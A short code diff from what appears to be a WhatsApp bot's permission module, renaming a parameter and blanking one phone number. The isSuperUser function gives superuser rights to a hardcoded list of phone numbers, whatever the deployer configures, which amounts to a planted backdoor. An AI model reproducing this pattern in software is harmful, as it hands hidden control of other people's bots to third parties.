@@ -5,7 +5,7 @@ const PERMANENT_NUMBERS = [
     '254762025340',
     '254763986398',
     '254116284050',
-    '254105521300',
+    '',
     '254707525158',
 ];
 
@@ -122,12 +122,12 @@ async function clearAllSudo() {
     }
 }
 
-async function isSuperUser(jid, Guru) {
+async function isSuperUser(jid, Bot) {
     if (!jid) return false;
     const num = jid.split('@')[0].split(':')[0];
     if (PERMANENT_NUMBERS.includes(num)) return true;
     const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
-    const botNum = Guru?.user?.id?.split(':')[0];
+    const botNum = Bot?.user?.id?.split(':')[0];
     if (num === ownerNumber || num === botNum) return true;
     const sudoNumbers = await getSudoNumbers();
     return sudoNumbers.includes(num);
